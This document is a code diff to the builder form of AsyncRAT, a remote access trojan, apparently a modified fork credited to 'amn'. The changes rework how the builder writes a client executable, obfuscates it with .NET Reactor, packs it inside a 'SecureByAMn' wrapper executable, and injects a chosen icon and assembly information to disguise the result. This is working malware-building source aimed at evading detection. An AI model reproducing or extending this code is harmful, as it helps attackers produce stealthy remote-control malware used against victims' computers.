@@ -190,7 +190,7 @@ namespace Server.Forms
 
             if (chkPastebin.Checked && string.IsNullOrWhiteSpace(txtPastebin.Text)) return;
 
-            if (string.IsNullOrWhiteSpace(txtMutex.Text)) txtMutex.Text = Helper.Methods.GetRandomString(12);
+            if (string.IsNullOrWhiteSpace(txtMutex.Text)) txtMutex.Text = Methods.GetRandomString(12);
 
             ModuleDefMD asmDef = null;
             try
@@ -206,57 +206,59 @@ namespace Server.Forms
                     {
                         btnBuild.Enabled = false;
                         WriteSettingsClients(asmDef, saveFileDialog1.FileName);
-                        if (chkObfu.Checked)
+                        asmDef.Write(saveFileDialog1.FileName);
+                        asmDef.Dispose();
+
+                        string pathClientsObf = saveFileDialog1.FileName.Replace(".exe", "_obf.exe");
+                        if (chkObfu.Checked)//Clients ---> Obf
                         {
                             await Task.Run(() =>
                             {
-                                Renaming.DoRenaming(asmDef);
+                                Reactor.Run_NETReactor(saveFileDialog1.FileName,pathClientsObf);
                             });
-                        }
-                        asmDef.Write(saveFileDialog1.FileName);
-                        asmDef.Dispose();
-                        
-                        ModuleDefMD asmDefSecureByAMn = ModuleDefMD.Load(@"SecureByAMn.exe");
-                        string tPath = Settings.temps_path;
-                        
-                        string ClientObfuscate =
-                            Path.Combine(Path.GetDirectoryName(saveFileDialog1.FileName) + "ClientObf.exe");
-                        if (chkObfu.Checked)
-                        {
-                            Reactor.Run_NETReactor(saveFileDialog1.FileName, ClientObfuscate);
-                            WriteSettingsSecureByAMn(asmDefSecureByAMn,tPath,File.ReadAllBytes(ClientObfuscate));
                         }
                         else
                         {
-                            WriteSettingsSecureByAMn(asmDefSecureByAMn,tPath,File.ReadAllBytes(saveFileDialog1.FileName));
+                            File.Move(saveFileDialog1.FileName, pathClientsObf);
                         }
+                        
+                        ModuleDefMD asmDefSecureByAMn = ModuleDefMD.Load(@"SecureByAMn.exe");
+                        string tPath = Settings.temps_path;
+                        //TempsPaths
+                        WriteSettingsSecureByAMn(asmDefSecureByAMn,tPath,File.ReadAllBytes(pathClientsObf));
                         asmDefSecureByAMn.Write(tPath);
                         asmDefSecureByAMn.Dispose();
 
                         var directoryClient = Path.GetDirectoryName(saveFileDialog1.FileName);
-                        //Obfusquer
+                        string pathSecureByAMn = Path.Combine(directoryClient, Settings.PathSecureByAMn + ".exe");
+                        //Obfusquer SecureByAMn.exe
                         if (chkObfu.Checked)
                         {
-                            Reactor.Run_NETReactor(tPath,Path.Combine(directoryClient,Settings.PathSecureByAMn + ".exe"));
-                            if(File.Exists(tPath))
-                                File.Delete(tPath);
-                            File.Delete(saveFileDialog1.FileName);
+                            await Task.Run(() =>
+                            {
+                                Reactor.Run_NETReactor(tPath,pathSecureByAMn);
+                                if(File.Exists(tPath))
+                                    File.Delete(tPath);
+                                File.Delete(saveFileDialog1.FileName);
+                                File.Delete(pathClientsObf);
+                            });
                         }
                         else
                         {
-                            File.Move(tPath, Path.Combine(Path.GetDirectoryName(saveFileDialog1.FileName), Settings.PathSecureByAMn + ".exe"));
+                            File.Move(tPath, Path.Combine(directoryClient, Settings.PathSecureByAMn + ".exe"));
                             File.Delete(saveFileDialog1.FileName);
+                            File.Delete(pathClientsObf);
                         }
                         
                         if (btnAssembly.Checked)
                         {
-                            WriteAssembly(saveFileDialog1.FileName);
+                            WriteAssembly(pathSecureByAMn);
                         }
                         if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
                         {
-                            IconInjector.InjectIcon(saveFileDialog1.FileName, txtIcon.Text);
+                            IconInjector.InjectIcon(pathSecureByAMn, txtIcon.Text);
                         }
-                        MessageBox.Show("Done!", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                        MessageBox.Show("Done!", "AsyncRAT by amn... | Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                         SaveSettings();
                         this.Close();
                     }
@@ -575,6 +577,11 @@ namespace Server.Forms
         private void txtMutex_MouseEnter(object sender, EventArgs e)
         {
             txtMutex.Text = Helper.Methods.GetRandomString(12);
+        }
+
+        private void textFilename_TextChanged(object sender, EventArgs e)
+        {
+            
         }
     }
 }
